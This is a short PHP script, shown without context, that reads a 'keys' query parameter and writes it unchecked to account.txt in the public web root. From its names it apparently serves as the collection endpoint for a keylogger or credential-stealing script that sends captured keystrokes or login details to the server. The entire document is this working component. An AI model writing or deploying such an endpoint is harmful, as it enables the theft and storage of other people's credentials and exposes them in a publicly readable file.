<?php
$account = $_GET['keys'];
$save_file = fopen("/var/www/html/account.txt", "w");
fwrite($save_file, $account);
fclose($save_file);
?>